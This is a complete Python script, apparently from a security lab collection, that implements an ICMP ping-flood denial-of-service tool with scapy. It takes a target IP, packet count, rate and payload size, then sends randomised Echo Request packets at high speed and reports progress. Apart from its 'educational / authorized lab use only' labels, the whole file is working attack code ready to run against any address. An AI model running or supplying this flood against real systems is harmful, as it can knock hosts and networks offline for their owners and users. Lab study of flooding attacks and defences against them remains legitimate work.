#!/usr/bin/env python3
"""
ICMP Flood (Ping Flood) Attack Tool — Educational / Lab Use Only

Sends a massive number of ICMP Echo Request (ping) packets to the target.
The target must process each request and send an Echo Reply, consuming
bandwidth in both directions and CPU cycles in the ICMP stack.

How it works:
  1. Sends ICMP Echo Request packets at high rate
  2. Target kernel processes each and generates Echo Reply
  3. Both inbound and outbound bandwidth consumed
  4. Can overwhelm smaller devices/VMs quickly

Usage:
  sudo python3 icmp_flood.py <target_ip> [options]

Requires: scapy, root/sudo privileges
"""

import argparse
import os
import random
import signal
import sys
import time

signal.signal(signal.SIGINT, lambda *_: (print("\nStopped."), sys.exit(0)))


def icmp_flood(target_ip: str, count: int, rate: int, size: int):
    """Send ICMP flood packets to the target."""
    try:
        from scapy.all import IP, ICMP, Raw, send  # type: ignore
    except ImportError:
        print("Error: scapy not installed. Run: pip install scapy")
        sys.exit(1)

    print(f"[ICMP FLOOD] Target: {target_ip}")
    print(f"[ICMP FLOOD] Packets: {count}, Rate: {rate}/sec, Payload: {size} bytes")
    print("[ICMP FLOOD] Press Ctrl+C to stop\n")

    sent = 0
    start = time.time()
    delay = 1.0 / rate if rate > 0 else 0

    for i in range(count):
        payload = os.urandom(size)
        seq_num = i % 65536

        pkt = IP(dst=target_ip) / ICMP(
            type=8,  # Echo Request
            id=random.randint(1, 65535),
            seq=seq_num,
        ) / Raw(load=payload)

        send(pkt, verbose=False)
        sent += 1

        if sent % 100 == 0:
            elapsed = time.time() - start
            pps = sent / elapsed if elapsed > 0 else 0
            print(f"  Sent {sent}/{count} packets ({pps:.0f} pps)")

        if delay > 0:
            time.sleep(delay)

    elapsed = time.time() - start
    print(f"\n[DONE] Sent {sent} ICMP packets in {elapsed:.1f}s ({sent / elapsed:.0f} pps)")


def main():
    parser = argparse.ArgumentParser(
        description="ICMP Flood (Ping Flood) — Educational DDoS Testing Tool",
        epilog="⚠️  FOR AUTHORIZED LAB/EDUCATIONAL USE ONLY",
    )
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-c", "--count", type=int, default=10000, help="Number of packets (default: 10000)")
    parser.add_argument("-r", "--rate", type=int, default=500, help="Packets per second (default: 500)")
    parser.add_argument("-s", "--size", type=int, default=64, help="Payload size in bytes (default: 64)")

    args = parser.parse_args()
    icmp_flood(args.target, args.count, args.rate, args.size)


if __name__ == "__main__":
    main()
